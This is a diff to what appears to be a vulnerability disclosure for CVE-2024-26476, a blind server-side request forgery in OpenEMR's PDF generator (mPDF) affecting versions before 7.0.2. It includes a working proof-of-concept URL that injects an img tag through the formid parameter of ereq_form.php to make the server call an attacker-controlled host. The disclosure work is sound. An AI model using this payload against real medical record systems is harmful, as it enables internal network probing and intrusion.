@@ -1,7 +1,9 @@
-# OpenEMR - Blind SSRF via HTML Injection in PDF Generator (mPDF)
+#  CVE-2024-26476 - OpenEMR Blind SSRF via HTML Injection in PDF Generator (mPDF)
 
 Basically there is no input sanitization in the PDF content that is generated in interface/procedure_tools/labcorp/ereq_form.php.
 For example we can use the $form_id variable (line 20) to inject an img tag with the src attribute that points to a server we control.
+
+Vulnerable: version < 7.0.2
 
 ```
 http://10.211.55.9/openemr/interface/procedure_tools/labcorp/ereq_form.php?debug=true&formid=<img src="http://10.37.129.2">
